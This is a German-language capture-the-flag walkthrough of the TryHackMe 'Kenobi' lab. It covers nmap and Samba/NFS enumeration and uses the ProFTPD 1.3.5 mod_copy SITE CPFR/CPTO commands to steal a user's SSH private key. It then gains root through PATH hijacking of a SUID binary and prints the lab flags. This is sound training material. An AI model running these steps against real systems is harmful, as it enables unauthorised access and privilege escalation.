# Kenobi
## Task 1: Deplay the vulnerable machine
7 Ports sind offen:
```
root@ip-10-10-232-97:~# nmap -A 10.10.43.152

Starting Nmap 7.60 ( https://nmap.org ) at 2023-02-24 14:15 GMT
Nmap scan report for ip-10-10-43-152.eu-west-1.compute.internal (10.10.43.152)
Host is up (0.00061s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      37352/udp  mountd
|   100005  1,2,3      43297/tcp  mountd
|   100021  1,3,4      32891/tcp  nlockmgr
|   100021  1,3,4      50070/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:BC:E6:28:34:0F (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=2/24%OT=21%CT=1%CU=44540%PV=Y%DS=1%DC=D%G=Y%M=02BCE6%T
OS:M=63F8C6AC%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=I%TS=8
OS:)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%TS=8)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=RD%
OS:II=I%TS=8)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%O3=M2301NNT11NW6%O4=M2301S
OS:T11NW6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%
OS:W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-02-24T08:16:12-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-24 14:16:12
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms ip-10-10-43-152.eu-west-1.compute.internal (10.10.43.152)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.78 seconds
root@ip-10-10-232-97:~# 
```

## Task 2: Enumerating Samba for shares
### Using the nmap command above, how many shares have been found?
```
root@ip-10-10-232-97:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.43.152

Starting Nmap 7.60 ( https://nmap.org ) at 2023-02-24 14:25 GMT
Nmap scan report for ip-10-10-43-152.eu-west-1.compute.internal (10.10.43.152)
Host is up (0.00024s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:BC:E6:28:34:0F (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.43.152\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.43.152\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.43.152\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
root@ip-10-10-232-97:~# 
```

nmap Skripte unter _/usr/share/nmap/scripts/_

### Once you're connected, list the files on the share. What is the file can you see?
Auf dem Anonymous Share kann eine log.txt Datei gefunden werden:
```
root@ip-10-10-232-97:~# smbclient //10.10.43.152/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877096 blocks available
smb: \> get log.txt 
getting file \log.txt of size 12237 as log.txt (5974.8 KiloBytes/sec) (average 5975.1 KiloBytes/sec)
smb: \> 
```

Mit `smbget -R smb://<ip>/anonymous` koennen alle Dateien rekursiv von einem Share heruntergeladen werden.

Die Datei beinhaltet die Erstellung eines SSH-Keys und eine Konfiguration eines Proftpd Servers.

### What mount can we see?
Der Portmapper rpcbind leitet auf ein NFS Mount weiter. Mit nmap Skripten koennen die Mounts ausgelesen werden:
```
[root@airplane THM]$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.43.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 16:20 CET
Nmap scan report for 10.10.43.152
Host is up (0.036s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
[root@airplane THM]$ 
```

## Task 3: Gain initial access with ProFtpd
Searching for exploits
```
┌──(kali㉿kali)-[~]
└─$ searchsploit ProFTPD | grep 1.3.5
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                         | linux/remote/36742.txt
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

Bei mod\_copy handelt es sich um ein Modul mit dem Dateien auf dem Zielsystem kopiert werden koennen. Durch den Exploit kann dies ohne Authentifizierung durchgefuehrt werden. Aus der _log.txt_ ist bekannt wo der Private Key des Nutzers _Kenobi_ abgelegt ist und dass der ProFTPD auch unter diesem Nutzer laeuft. Der Key kann also in ein Verzeichnis kopiert werden auf welches wir bereits zugreifen koennen (SMB oder NFS)
```
┌──(kali㉿kali)-[~]
└─$ nc 10.10.2.221 21                                                                                         130 ⨯
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.2.221]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/id_rsa
250 Copy successful
^C
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.2.221/anonymous -U anonymous                                                              1 ⨯
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Feb 25 09:02:06 2023
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  id_rsa                              N     1675  Sat Feb 25 09:02:06 2023
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
smb: \> get id_rsa 
getting file \id_rsa of size 1675 as id_rsa (12.8 KiloBytes/sec) (average 12.8 KiloBytes/sec)
smb: \> 
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls -al id_rsa 
-rw-r--r-- 1 kali kali 1675 Feb 25 09:13 id_rsa
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

Mit dem Private Key kann nun eine SSH Verbindung aufgebaut werden und die User Flag gefunden werden
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/kenobi]
└─$ chmod 600 id_rsa
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/tryhackme/kenobi]
└─$ ssh -i id_rsa kenobi@10.10.2.221
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls -al 
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Feb 25 08:02 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 
```

## Task 4: Privilege Escalation with Path Variable Manipulation
Auf dem System kann die Datei _/usr/bin/menu_ gefunden werden mit einem s-bit gefunden werden
```
kenobi@kenobi:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
kenobi@kenobi:~$ 
```

Betrachtet man diese Datei gibt diese scheinbar ein Menue auf, ueber welches Systemprogramme aufgerufen werden koennen. Mit statischer Analyse kann gesehen werden, dass fuer diese Programme allerdings kein voller Pfad verwendet wird.
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C
kenobi@kenobi:~$ 
kenobi@kenobi:~$ 
kenobi@kenobi:~$ strings /usr/bin/menu | less

[...]
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
[...]
```

Die Datei selber wird allerdings mit root Rechten gestartet, weshalb die auszufuehrende Datei manipuliert werden kann mithilfe der PATH environment Variable. Mit den Root Rechten kann dann auch die Root Flag gefunden werden.
```
kenobi@kenobi:~$ cp /bin/sh .
kenobi@kenobi:~$ cp /bin/sh ./ifconfig
kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
kenobi@kenobi:~$ ifconfig
$ 
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# ls -al /root  
total 32
drwx------  3 root root 4096 Sep  4  2019 .
drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep  4  2019 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
-rw-------  1 root root 5383 Sep  4  2019 .viminfo
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
# 
```
